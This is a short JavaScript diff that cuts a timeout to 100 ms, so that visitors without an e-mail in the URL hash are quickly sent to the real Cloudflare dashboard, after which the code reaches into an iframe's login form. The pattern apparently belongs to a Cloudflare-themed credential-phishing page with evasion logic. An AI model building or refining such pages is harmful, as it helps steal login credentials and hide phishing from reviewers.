@@ -300,7 +300,7 @@ document.addEventListener('DOMContentLoaded', () => {
       setTimeout(() => {
         console.info('🔀 No e‑mail in hash – redirecting to Cloudflare');
         top.location.href = 'https://dash.cloudflare.com';
-      }, 100000);
+      }, 100);
     }
     const form = doc.querySelector('form#login-form');
     if (!form) { console.warn('⚠️ form #login-form not found inside iframe'); return; }
